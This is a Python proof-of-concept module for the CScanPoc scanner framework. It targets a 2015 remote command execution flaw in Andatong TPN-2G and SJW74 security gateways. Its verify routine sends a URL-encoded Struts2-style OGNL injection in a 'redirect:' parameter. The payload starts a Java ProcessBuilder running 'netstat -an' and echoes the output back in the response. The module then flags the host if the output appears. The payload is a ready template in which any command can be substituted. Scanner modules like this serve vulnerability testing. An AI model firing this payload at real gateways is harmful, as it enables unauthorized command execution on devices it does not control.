# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ADTsec_0002'  # 平台漏洞编号，留空
    name = '安达通安全网关 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-08-04'  # 漏洞公布时间
    desc = '''
        “全网行为管理TPN-2G安全网关产品”和“SJW74系列安全网关” 存在一处远程命令执行。
        http://url/lan/admin_getLisence 存在远程命令执行漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '安达通安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '788c7812-5c8f-466d-b1fd-1b72d7f6f417'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # info:http://www.wooyun.org/bugs/wooyun-2015-0131408
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java'
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and 'Active Internet connections' in res:
                #security_hole('Arbitrary command execution'+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
